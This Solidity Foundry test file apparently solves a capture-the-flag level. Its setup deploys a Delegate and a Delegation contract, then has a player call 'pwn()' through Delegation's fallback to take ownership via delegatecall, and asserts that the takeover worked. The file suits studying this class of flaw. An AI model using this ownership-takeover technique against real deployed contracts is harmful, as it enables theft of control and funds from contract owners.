// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegate.sol";

contract DelegateTest is Test {
    Delegation public delegation;
    Delegate public delegate;

    address player = makeAddr("player");

    function setUp() public {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));

        assertEq(delegation.owner(), address(this));
        assertEq(delegate.owner(), address(this));

        vm.prank(player);
        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        assertEq(success, true);
        assertEq(delegation.owner(), address(player));
    }

    function test_Increment() public {}
}
